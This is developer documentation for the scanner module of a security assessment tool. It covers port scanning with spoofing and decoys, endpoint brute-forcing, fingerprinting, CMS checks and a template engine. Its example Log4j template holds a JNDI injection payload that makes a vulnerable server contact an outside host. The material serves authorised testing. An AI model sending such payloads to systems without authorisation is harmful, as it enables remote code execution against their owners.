# Scanner Module

The Scanner module is responsible for the "discovery" phase of a security assessment. It includes port scanning, service identification, endpoint discovery, vulnerability template matching, and CMS-specific security scanning.

## Core Capabilities (`src/scanner/`)

### Port Scanning (`ports/`)

High-performance TCP and UDP port scanning.

- **TCP Connect Scan**: Standard TCP connection using `tokio::net::TcpStream` with semaphore-controlled concurrency
- **SYN Scan**: Raw socket scanning via `pnet` crate (requires `stress-testing` feature + Unix + root privileges)
- **Service Fingerprinting**: Once a port is found open, Eggsec attempts to identify the running service and version
- **Spoofed Scanning**: IP spoofing with decoy support (Simultaneous or Staggered modes)
- **Timing Templates**: Nmap-style T0-T5 presets controlling parallelism, timeouts, and rate limits

#### Key Types

- **`PortScanConfig`** (`ports/mod.rs:34`): Configuration struct for scan parameters — `ports`, `concurrency`, `timeout_duration`, `tui_mode`, `spoof_config`, `progress_tx`, `max_results`
- **`PortResult`** (`ports/mod.rs:70`): Per-port result — `port`, `status`, `service`
- **`PortScanResults`** (`ports/mod.rs:77`): Aggregate results — `host`, `ports_scanned`, open ports
- **`MAX_SCAN_RESULTS`** (`ports/mod.rs:28`): Hard cap of 10,000 results to bound memory usage
- **`ScanType`** (`spoof.rs:21`): Enum of raw scan types — `Syn`, `Null`, `Fin`, `Xmas` (default: `Syn`)

#### Port Priority

`PortPriority` (`timing.rs:160`) categorizes ports into critical/high/medium/low tiers for prioritized scanning. Critical ports include 21, 22, 25, 53, 80, 443, 3306, 3389, 8080, and others commonly targeted in assessments.

### Endpoint Discovery (`endpoints.rs`, `wordlist.rs`)

Finding hidden files and directories on web servers.

- **Wordlist-based Brute Forcing**: Uses extensive wordlists (223 built-in paths) to find common endpoints
- **Custom Wordlist Loading**: Load endpoints from file via `--wordlist` / `-w` CLI flag
- **Wordlist Parsing** (`wordlist.rs`): Validated parsing with line-based splitting, `#` comment support, path normalization (ensures leading `/`), and validation (max 2048 chars, no whitespace, no control chars)
- **Custom Payload Support**: Allows for targeted discovery based on specific technologies
- **Note**: Does NOT implement recursive crawling - flat wordlist scan only

### Fingerprinting (`fingerprint.rs`, `fingerprint_types.rs`)

Identifying the technology stack of a target.

- **HTTP Banner Grabbing**: Extracting information from server headers
- **Technology Detection**: Identifying frameworks (e.g., React, Django), databases, and CMS (e.g., WordPress, Drupal)
- **CVE Mapping**: Automatically mapping discovered versions to known vulnerabilities

#### Fingerprint Types (`fingerprint_types.rs`)

Structured types for confidence-weighted fingerprinting:

- **`FingerprintConfidence`**: Ordered enum — `Unknown` < `Low` < `Medium` < `High` < `Confirmed`
- **`EvidenceType`**: Enum of evidence sources — `Banner`, `TlsCertificate`, `TlsAlpn`, `HttpHeader`, `HttpResponse`, `ProtocolNegotiation`, `DnsRecord`, `PortState`
- **`FingerprintEvidence`**: Captured evidence with `kind`, `raw_value`, `redacted_value`, and `confidence_contribution`
- **`ServiceIdentity`**: Normalized service identity — `service_name`, `version`, `product`, `vendor`, `protocol`, `transport`, `port`, `confidence`, `evidence`, `cpe`, `possible_cves`
  - `is_version_reliable()`: Returns true only for `Confirmed`/`High` confidence with a version present
  - `service_key()`: Normalized deduplication key (`name:protocol:transport:port`)
- **`EnhancedFingerprint`**: Top-level result wrapping `identity`, `all_alternatives`, `raw_banner`, `scan_timestamp`
  - `has_conflicts()`: True when alternative fingerprints exist

### Advanced Probing (`icmp_probe.rs`, `udp_fingerprint.rs`)

- **ICMP Probing**: Host discovery using echo requests (requires `stress-testing` feature + Unix)
- **UDP Fingerprinting**: Identifying services on UDP ports through specific probe payloads
- **Spoofing (`spoof.rs`)**: Techniques for source IP spoofing and decoys (where supported)

#### Feature Gating

Raw socket and spoofing features require **both** `stress-testing` feature flag **and** Unix platform. The `ScanType` enum and `SpoofConfig` are always available, but the actual raw socket construction and pnet imports are gated behind `#[cfg(all(feature = "stress-testing", unix))]`.

### CMS Scanning (`cms/`)

CMS-specific security scanning for WordPress, Drupal, and Joomla.

- **CMS Detection**: Identifies CMS type from HTML signatures (`wp-content`, `drupal`, `joomla`), XML-RPC probing, and version extraction via regex patterns
- **Component Enumeration**: Discovers installed plugins, themes, and modules specific to each CMS
- **Vulnerability Checking**: Version-based CVE mapping against known vulnerabilities per CMS
- **Misconfiguration Detection**: Checks for debug mode exposure, directory listing, insecure XML-RPC, and other CMS-specific misconfigurations

#### Key Types (`cms/mod.rs`)

- **`CmsType`**: Enum — `WordPress`, `Drupal`, `Joomla`, `Unknown`
- **`CmsTarget`**: Target descriptor — `url`, `detected_cms`, `version`, `plugins`, `themes`
- **`CmsScanResult`**: Scan output — `target`, `cms_type`, `version`, `vulnerabilities`, `misconfigurations`, `security_headers`, `overall_severity`
- **`CmsVulnerability`**: Identified vulnerability — `id`, `title`, `severity`, `description`, `cve_ids`, `fixed_in_version`
- **`CmsMisconfiguration`**: Configuration issue — `id`, `title`, `severity`, `description`, `recommendation`
- **`CmsScanner`**: Main scanner struct with `new()`, `new_insecure()`, `detect_cms()`, `scan()`, and helper methods for building results

#### CMS-Specific Modules

- **`wordpress.rs`**: Plugin/theme enumeration, XML-RPC checks, debug mode detection, version-based vulnerability scanning
- **`drupal.rs`**: Module enumeration, version detection, Drupal-specific misconfiguration checks
- **`joomla.rs`**: Extension enumeration, XML parsing with bounds-checked slicing, Joomla-specific security checks

All CMS enumerate functions accept `&Client` to reuse the caller's HTTP client and respect TLS verification settings.

### Template Engine (`templates/`)

Nuclei-style vulnerability template engine for declarative, community-contributed vulnerability scanning.

#### Template Format

Templates are defined in YAML:

```yaml
id: CVE-2021-44228
info:
  name: Log4j Remote Code Execution
  author: eggsec
  severity: critical
  tags: [cve, rce]
matchers:
  - type: http
    path: "/"
    search:
      - pattern: "vulnerable"
        mode: word
requests:
  - method: GET
    path: "/"
    headers:
      User-Agent: "${jndi:ldap://{{interactsh-url}}/a}"
```

#### Key Components

- **`TemplateEngine`** (`executor.rs:279`): Main entry point — wraps `TemplateExecutor` in `Arc` for shared access. Methods: `scan()`, `scan_with_callback()`
- **`TemplateExecutor`** (`executor.rs:17`): Executes templates against targets — handles HTTP/DNS request construction, response matching, Interactsh variable substitution, and result aggregation
- **`TemplateLoader`** (`loader.rs:11`): Loads and validates templates from YAML/JSON files — supports directory recursion, path validation, tag-based filtering (`load_by_tag()`), ID lookup (`load_by_id()`)
- **`TemplateMatcher`** (`matcher.rs:34`): Matches template conditions against HTTP responses and DNS results — supports word/regex/binary match modes, Interactsh callback detection, and a global regex cache (`REGEX_CACHE`) for performance
- **`TemplateMarketplace`** (`marketplace.rs:34`): Downloads and manages community templates — supports caching, signature verification, tag filtering, and sync to local directories

#### Key Types (`templates/models.rs`)

- **`VulnerabilityTemplate`**: Top-level template — `id`, `info`, `matchers`, `requests`. Method `severity()` maps string to `Severity` enum
- **`TemplateInfo`**: Metadata — `name`, `author`, `severity`, `description`, `tags`, `references`, `remediation`
- **`Matcher`**: Tagged enum — `Http(HttpMatcher)`, `Dns(DnsMatcher)`, `Other`
- **`HttpMatcher`**: HTTP matching conditions — `path`, `method`, `headers`, `body`, `search`, `status_codes`, `interactsh`
- **`DnsMatcher`**: DNS matching conditions — `query_type`, `search`
- **`SearchPattern`**: Pattern definition — `pattern`, `mode` (word/regex/binary), `encoding`
- **`MatchMode`**: Enum — `Word` (default), `Regex`, `Binary`
- **`TemplateRequest`**: Request to send — `method`, `path`, `headers`, `body`, `raw`

#### Template Signing & Verification (`verify.rs`)

Ed25519-based signing for community templates:

- **`TemplateSigner`**: Signs templates with Ed25519 keys — supports key generation and import from raw bytes
- **`TemplateVerifier`**: Verifies signed templates — supports public key import and raw signature verification
- **`SignedTemplate`**: Envelope containing template, base64 signature, base64 public key, and `SignerInfo`

#### Execution Flow

```
TemplateLoader.load_all()
  → TemplateExecutor.execute_on_target()
    → send_request() for each template request
    → TemplateMatcher.match_template() against responses
    → TemplateExecutionResult (matched/not matched, severity, responses)
```

## Timing and Performance (`timing.rs`)

The scanner uses "Timing Templates" (similar to Nmap's -T0 through -T5) to control the speed and aggressiveness of scans, ensuring they stay within the limits of the target network and the user's requirements.

## Integration

Discovered information is often fed into the **Fuzzer** or **Vulnerability Management** modules for further analysis.

## Scope Enforcement

All scanner operations check the `Scope` before initiating connections. The scanner uses the shared `EnforcementContext` to evaluate whether targets are in scope. In strict profiles (`McpStrict`, `AgentStrict`, `CiStrict`), targets must match an explicit scope rule before scanning begins. Private IP addresses are blocked by default unless explicitly allowed via scope rules.

## Key Design Patterns

| Pattern | Usage |
|---------|-------|
| `DashMap` | Lock-free concurrent result collection |
| `tokio::sync::Semaphore` | Concurrency control for parallel operations |
| `rustc_hash::FxHashMap` | High-performance hash map (instead of std `HashMap`) |
| Feature gating (`#[cfg(all(feature = "stress-testing", unix))]`) | ICMP and raw socket features gated behind feature flag + platform |
| `Arc::try_unwrap` + `map_err` | Safe error handling when collecting parallel results |
| `LazyLock` | Static initialization for version detection patterns and regex cache |

## Notable Bug Fixes

| File | Issue | Fix |
|------|-------|-----|
| `ports/spoofed.rs:288-295` | Fragmented packets never populated `sent_packets` map, causing all responses to be silently dropped | Added `sent_packets.insert()` after sending fragments |
| `spoof.rs:126` | `max_rate=0` caused division by zero panic in spoofed scan rate limiting | Added validation: `max_rate` must be > 0 |
| `templates/marketplace.rs:176` | `template_id` path traversal via unsanitized IDs | Added validation rejecting `/`, `\`, `..` in template IDs |
| `udp_fingerprint.rs:301-320` | `TokenBucket` race condition in refill (non-atomic read-modify-write) | Refactored to use `compare_exchange` loop in `refill()` |
| `spoof.rs:432` | `build_fragmented_packets` over-allocated buffer causing trailing zeros on wire for last fragment | Changed to `vec![0u8; 20 + chunk.len()]` for exact per-fragment sizing |
